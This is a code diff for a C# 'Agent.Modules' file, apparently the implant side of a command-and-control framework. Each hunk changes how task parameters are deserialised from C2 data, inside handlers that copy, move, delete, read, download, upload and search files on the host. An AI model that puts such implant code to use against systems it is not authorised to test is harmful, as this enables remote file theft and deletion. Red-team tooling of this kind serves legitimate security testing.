@@ -77,7 +77,7 @@ namespace Agent.Modules
         {
             try
             {
-                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data, false).Parameters;
+                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
 
                 var source = (string)parameters.FirstOrDefault(p => p.Name.Equals("Source", StringComparison.OrdinalIgnoreCase)).Value;
                 var destination = (string)parameters.FirstOrDefault(p => p.Name.Equals("Destination", StringComparison.OrdinalIgnoreCase)).Value;
@@ -94,7 +94,7 @@ namespace Agent.Modules
         {
             try
             {
-                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data, false).Parameters;
+                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
 
                 var source = (string)parameters.FirstOrDefault(p => p.Name.Equals("Source", StringComparison.OrdinalIgnoreCase)).Value;
                 var destination = (string)parameters.FirstOrDefault(p => p.Name.Equals("Destination", StringComparison.OrdinalIgnoreCase)).Value;
@@ -111,7 +111,7 @@ namespace Agent.Modules
         {
             try
             {
-                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data, false).Parameters;
+                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
                 var path = (string)parameters.FirstOrDefault(p => p.Name.Equals("Path", StringComparison.OrdinalIgnoreCase)).Value;
 
                 File.Delete(path);
@@ -126,7 +126,7 @@ namespace Agent.Modules
         {
             try
             {
-                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data, false).Parameters;
+                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
                 var path = (string)parameters.FirstOrDefault(p => p.Name.Equals("Path", StringComparison.OrdinalIgnoreCase)).Value;
 
                 var text = File.ReadAllText(path);
@@ -142,7 +142,7 @@ namespace Agent.Modules
         {
             try
             {
-                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data, false).Parameters;
+                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
                 var path = (string)parameters.FirstOrDefault(p => p.Name.Equals("Path", StringComparison.OrdinalIgnoreCase)).Value;
 
                 var file = Convert.ToBase64String(File.ReadAllBytes(path));
@@ -158,7 +158,7 @@ namespace Agent.Modules
         {
             try
             {
-                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data, false).Parameters;
+                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
                 var source = Convert.FromBase64String((string)parameters.FirstOrDefault(p => p.Name.Equals("Source", StringComparison.OrdinalIgnoreCase)).Value);
                 var destination = (string)parameters.FirstOrDefault(p => p.Name.Equals("Destination", StringComparison.OrdinalIgnoreCase)).Value;
 
@@ -174,7 +174,7 @@ namespace Agent.Modules
         {
             try
             {
-                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data, false).Parameters;
+                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
 
                 var path = (string)parameters.FirstOrDefault(p => p.Name.Equals("Path", StringComparison.OrdinalIgnoreCase)).Value;
                 var pattern = (string)parameters.FirstOrDefault(p => p.Name.Equals("Pattern", StringComparison.OrdinalIgnoreCase)).Value;
@@ -194,7 +194,7 @@ namespace Agent.Modules
         {
             try
             {
-                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data, false).Parameters;
+                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
 
                 var source = (string)parameters.FirstOrDefault(p => p.Name.Equals("Source", StringComparison.OrdinalIgnoreCase)).Value;
                 var target = (string)parameters.FirstOrDefault(p => p.Name.Equals("Target", StringComparison.OrdinalIgnoreCase)).Value;
